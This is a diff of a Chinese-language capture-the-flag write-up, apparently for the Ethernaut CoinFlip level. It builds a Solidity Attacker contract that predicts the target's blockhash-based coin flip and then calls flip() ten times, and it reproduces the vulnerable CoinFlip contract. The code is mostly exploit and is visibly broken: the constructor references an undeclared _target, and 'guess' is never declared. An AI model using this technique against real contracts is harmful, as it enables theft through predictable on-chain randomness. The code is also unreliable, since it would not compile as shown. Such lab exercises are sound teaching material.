@@ -57,3 +57,108 @@ contract Attacker {
 }
 ```
 
+接下来我们需要定义一个函数，将一个boolean值作为我们猜测的值，这里注意的是我们还需要保证传入的值在使用`target.flip()`时的返回值永远为true。
+```
+contract Attacker {
+  
+  CoinFlip private immutable target;
+  constructor(){
+    target = CoinFlip(address _target);
+  }
+
+  function flip() external {
+    guess = _guess(); // 预先假设是一个_guess函数返回的值
+    require(target.flip(guess), "flip failed");
+  } 
+
+}
+```
+最后我们需要确定_guess()函数的返回值是什么，那么就根据原合约代码中的思路复写一下就好。
+
+```
+contract Attacker {
+
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  
+  CoinFlip private immutable target;
+  constructor(){
+    target = CoinFlip(address _target);
+  }
+
+  function flip() external {
+    guess = _guess(); // 预先假设是一个_guess函数返回的值
+    require(target.flip(guess), "flip failed");
+  } 
+
+  function _guess() private view returns (bool){
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+    return side;
+  }
+}
+```
+让我们来一下最后的攻击代码
+
+## 攻击代码
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attacker {
+
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  
+  CoinFlip private immutable target;
+  constructor(){
+    target = CoinFlip(address _target);
+  }
+
+  function flip() external {
+    guess = _guess(); // 预先假设是一个_guess函数返回的值
+    require(target.flip(guess), "flip failed");
+  } 
+
+  function _guess() private view returns (bool){
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+    return side;
+  }
+}
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+```
+
+## 攻击过程
+1. 部署合约，部署是target为CoinFlip合约的地址
+2. 调用Attacker.flip() 10次。
